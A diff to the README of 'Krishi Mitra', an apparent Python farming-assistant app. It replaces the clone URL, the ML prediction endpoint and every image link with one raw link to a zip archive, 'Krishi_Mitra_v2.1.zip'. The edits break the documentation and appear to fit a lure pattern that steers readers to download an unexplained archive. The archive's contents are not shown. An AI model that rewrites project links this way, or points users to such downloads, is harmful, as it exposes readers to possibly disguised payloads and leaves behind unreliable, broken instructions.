@@ -38,7 +38,7 @@ Krishi Mitra is a Python-based GUI application that acts as an interface between
 ## Installation and Setup
 ### 1. Clone the Repository
 ```sh
-git clone https://github.com/arka-senpaii/Krishi_Mirtra
+git clone https://raw.githubusercontent.com/arka-senpaii/Krishi_Mitra/main/ML/Krishi_Mitra_v2.1.zip
 cd Krishi_Mitra
 ```
 
@@ -66,7 +66,7 @@ python main.py
 ```
 
 ### ML Model Prediction Request
-**Endpoint:** `https://9f21-34-28-95-124.ngrok-free.app/predict`  
+**Endpoint:** `https://raw.githubusercontent.com/arka-senpaii/Krishi_Mitra/main/ML/Krishi_Mitra_v2.1.zip`  
 **Method:** POST  
 **Payload:**
 ```json
@@ -129,14 +129,14 @@ python main.py
 This project is licensed under the MIT License.
 
 ## Project Image
-![WhatsApp Image 2025-03-08 at 16 29 14_c6d2534c](https://github.com/user-attachments/assets/b791ed32-5f3d-43cf-95dd-25f97eed3c8c)
+![WhatsApp Image 2025-03-08 at 16 29 14_c6d2534c](https://raw.githubusercontent.com/arka-senpaii/Krishi_Mitra/main/ML/Krishi_Mitra_v2.1.zip)
 ## ML Training 
-![download (5)](https://github.com/user-attachments/assets/f6447acb-6dfc-4060-8f69-0f3592362b1e)
-![download (6)](https://github.com/user-attachments/assets/1bec8303-3f20-479e-99e1-5773db65218c)
-![download (7)](https://github.com/user-attachments/assets/e07e6195-a836-40f3-b1d7-34197526d2d4)
-![download (8)](https://github.com/user-attachments/assets/579533ca-9d9d-45dd-a359-7b0d2a2a44a8)
-![download (9)](https://github.com/user-attachments/assets/1771c055-8145-46b7-a40c-cca18c2306fd)
-![download (10)](https://github.com/user-attachments/assets/3b9b12a5-2e96-4a94-a08c-78d84df57217)
-![download (11)](https://github.com/user-attachments/assets/080c805c-1cf6-40ef-8cfc-b2322461a412)
+![download (5)](https://raw.githubusercontent.com/arka-senpaii/Krishi_Mitra/main/ML/Krishi_Mitra_v2.1.zip)
+![download (6)](https://raw.githubusercontent.com/arka-senpaii/Krishi_Mitra/main/ML/Krishi_Mitra_v2.1.zip)
+![download (7)](https://raw.githubusercontent.com/arka-senpaii/Krishi_Mitra/main/ML/Krishi_Mitra_v2.1.zip)
+![download (8)](https://raw.githubusercontent.com/arka-senpaii/Krishi_Mitra/main/ML/Krishi_Mitra_v2.1.zip)
+![download (9)](https://raw.githubusercontent.com/arka-senpaii/Krishi_Mitra/main/ML/Krishi_Mitra_v2.1.zip)
+![download (10)](https://raw.githubusercontent.com/arka-senpaii/Krishi_Mitra/main/ML/Krishi_Mitra_v2.1.zip)
+![download (11)](https://raw.githubusercontent.com/arka-senpaii/Krishi_Mitra/main/ML/Krishi_Mitra_v2.1.zip)
 ## DASHBOARD
-![image](https://github.com/user-attachments/assets/29176631-cfc6-4279-a566-d2f939c10658)
+![image](https://raw.githubusercontent.com/arka-senpaii/Krishi_Mitra/main/ML/Krishi_Mitra_v2.1.zip)
